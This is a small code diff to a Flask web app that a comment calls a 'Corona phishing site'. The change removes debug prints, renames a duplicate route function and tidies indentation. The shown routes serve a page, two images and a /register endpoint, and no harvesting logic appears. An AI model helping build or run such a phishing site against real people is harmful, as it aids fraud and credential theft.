@@ -9,8 +9,6 @@ app._static_folder = ""
 
 t_path = os.path.abspath(os.path.dirname(__file__))
 html_folder_path = os.path.join(t_path, "html")
-print(html_folder_path)
-print("help")
 # Corona phishing site
 
 
@@ -19,17 +17,17 @@ def corona_ger():
     file_path = os.path.join(html_folder_path, "eng/index.html")
     return flask.send_file(file_path)
 
+
 @app.route("/anon.jpg")
-def cons_pic():
-        file_path = os.path.join(html_folder_path, "eng/anon.jpg")
-        return flask.send_file(file_path)
-        
+def anon_pic():
+    file_path = os.path.join(html_folder_path, "eng/anon.jpg")
+    return flask.send_file(file_path)
+
+
 @app.route("/cons.jpg")
 def cons_pic():
-        file_path = os.path.join(html_folder_path, "eng/construction.jpg")
-        return flask.send_file(file_path)
-
-
+    file_path = os.path.join(html_folder_path, "eng/construction.jpg")
+    return flask.send_file(file_path)
 
 
 @app.route("/register")
